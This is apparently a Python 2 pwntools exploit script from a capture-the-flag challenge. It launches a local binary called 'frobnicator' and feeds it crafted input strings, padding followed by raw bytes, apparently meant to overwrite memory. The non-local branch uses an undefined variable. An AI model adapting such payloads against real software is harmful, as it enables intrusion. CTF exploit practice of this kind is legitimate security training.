#! /usr/bin/env python2

from pwn import *
from sys import argv

islocal = True 

if islocal:
    r = process('./frobnicator')


a3 = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8c\x99\x9f\x98\x9e\xa3J\x92\x9f\x98\x9e\x8f\x9c\x4b\x4b*'

a5 = 'AAAAAAAA********\xca\x4a\x8a*****\xd2\x4a\x8a*****AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaa*******\xca*******'

a1 = ''
args = ['', a3, '', a5]

# Prevent race conditions
r.recvuntil(':\n')

r.sendline(a1)

for a in args:
    r.recvuntil(':\n')
    r.sendline(a)


s = r.recvuntil('...')
r.send('\n')
if not islocal:
    mc.sendline('halt')

print s
